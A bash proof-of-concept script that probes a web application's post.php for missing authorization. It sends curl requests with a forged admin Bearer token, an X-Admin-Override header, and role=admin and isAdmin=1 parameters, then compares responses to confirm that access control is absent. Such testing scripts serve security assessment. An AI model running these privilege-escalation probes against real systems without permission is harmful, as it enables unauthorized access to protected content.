#!/bin/bash

# POC: Missing Authorization - No Access Control Enforcement
# This script demonstrates that the application has no authorization mechanism
# and serves all posts regardless of authorization headers, role parameters, or admin overrides

TARGET_URL="${1:-http://localhost}"
POST_ID="${2:-1}"

echo "[*] Testing Missing Authorization Controls on post.php"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Basic post access (baseline)
echo "[Test 1] Baseline - Requesting post without authorization"
echo "Command: curl -s \"$TARGET_URL/post.php?id=$POST_ID\""
RESPONSE1=$(curl -s "$TARGET_URL/post.php?id=$POST_ID")
HTTP_CODE1=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/post.php?id=$POST_ID")
echo "HTTP Status: $HTTP_CODE1"
if echo "$RESPONSE1" | grep -q "Post"; then
    echo "Result: ✓ Post served without authentication"
    echo ""
else
    echo "Result: Could not retrieve post content"
    echo ""
fi

# Test 2: Authorization header with admin token (should be ignored)
echo "[Test 2] Authorization header with Bearer token (should be ignored)"
echo "Command: curl -s -H 'Authorization: Bearer admin-token' \"$TARGET_URL/post.php?id=$POST_ID\""
RESPONSE2=$(curl -s -H "Authorization: Bearer admin-token" "$TARGET_URL/post.php?id=$POST_ID")
HTTP_CODE2=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer admin-token" "$TARGET_URL/post.php?id=$POST_ID")
echo "HTTP Status: $HTTP_CODE2"
if [ "$HTTP_CODE1" = "$HTTP_CODE2" ]; then
    echo "Result: ✓ Authorization header ignored - same response with/without token"
else
    echo "Result: Different response codes"
fi
echo ""

# Test 3: Admin override header (should be ignored)
echo "[Test 3] X-Admin-Override header (should be ignored)"
echo "Command: curl -s -H 'X-Admin-Override: true' \"$TARGET_URL/post.php?id=$POST_ID\""
RESPONSE3=$(curl -s -H "X-Admin-Override: true" "$TARGET_URL/post.php?id=$POST_ID")
HTTP_CODE3=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Admin-Override: true" "$TARGET_URL/post.php?id=$POST_ID")
echo "HTTP Status: $HTTP_CODE3"
if [ "$HTTP_CODE1" = "$HTTP_CODE3" ]; then
    echo "Result: ✓ Admin override header ignored - same response"
else
    echo "Result: Different response codes"
fi
echo ""

# Test 4: Role parameter (should be ignored)
echo "[Test 4] Role parameter - role=admin (should be ignored)"
echo "Command: curl -s \"$TARGET_URL/post.php?id=$POST_ID&role=admin\""
RESPONSE4=$(curl -s "$TARGET_URL/post.php?id=$POST_ID&role=admin")
HTTP_CODE4=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/post.php?id=$POST_ID&role=admin")
echo "HTTP Status: $HTTP_CODE4"
if [ "$HTTP_CODE1" = "$HTTP_CODE4" ]; then
    echo "Result: ✓ Role parameter ignored - same response"
else
    echo "Result: Different response codes"
fi
echo ""

# Test 5: isAdmin parameter (should be ignored)
echo "[Test 5] Privilege escalation attempt - isAdmin=1 (should be ignored)"
echo "Command: curl -s \"$TARGET_URL/post.php?id=$POST_ID&isAdmin=1\""
RESPONSE5=$(curl -s "$TARGET_URL/post.php?id=$POST_ID&isAdmin=1")
HTTP_CODE5=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/post.php?id=$POST_ID&isAdmin=1")
echo "HTTP Status: $HTTP_CODE5"
if [ "$HTTP_CODE1" = "$HTTP_CODE5" ]; then
    echo "Result: ✓ Privilege escalation parameter ignored"
else
    echo "Result: Different response codes"
fi
echo ""

# Test 6: Multiple authorization methods combined (should all be ignored)
echo "[Test 6] Multiple authorization methods combined"
echo "Command: curl -s -H 'Authorization: Bearer admin' -H 'X-Admin-Override: true' \"$TARGET_URL/post.php?id=$POST_ID&role=admin&isAdmin=1\""
RESPONSE6=$(curl -s -H "Authorization: Bearer admin" -H "X-Admin-Override: true" "$TARGET_URL/post.php?id=$POST_ID&role=admin&isAdmin=1")
HTTP_CODE6=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer admin" -H "X-Admin-Override: true" "$TARGET_URL/post.php?id=$POST_ID&role=admin&isAdmin=1")
echo "HTTP Status: $HTTP_CODE6"
if [ "$HTTP_CODE1" = "$HTTP_CODE6" ]; then
    echo "Result: ✓ All authorization methods ignored - identical response"
else
    echo "Result: Different response codes"
fi
echo ""

# Test 7: Different content verification
echo "[Test 7] Verifying content consistency across all requests"
HASH1=$(echo "$RESPONSE1" | md5sum | awk '{print $1}')
HASH2=$(echo "$RESPONSE2" | md5sum | awk '{print $1}')
HASH3=$(echo "$RESPONSE3" | md5sum | awk '{print $1}')
HASH4=$(echo "$RESPONSE4" | md5sum | awk '{print $1}')
HASH5=$(echo "$RESPONSE5" | md5sum | awk '{print $1}')
HASH6=$(echo "$RESPONSE6" | md5sum | awk '{print $1}')

if [ "$HASH1" = "$HASH2" ] && [ "$HASH2" = "$HASH3" ] && [ "$HASH3" = "$HASH4" ] && [ "$HASH4" = "$HASH5" ] && [ "$HASH5" = "$HASH6" ]; then
    echo "Result: ✓ CONFIRMED - Identical content returned regardless of authorization attempts"
    echo "All requests returned identical response (hash: $HASH1)"
else
    echo "Result: Different content detected"
fi
echo ""

echo "[*] Summary:"
echo "✓ NO AUTHORIZATION CONTROLS DETECTED"
echo "✓ All posts served regardless of authorization headers, role parameters, or privilege escalation attempts"
echo "✓ No HTTP 403 Forbidden responses - no access control enforcement"
echo "✓ Authorization headers (Authorization, X-Admin-Override) completely ignored"
echo "✓ Role and privilege parameters have no effect on access"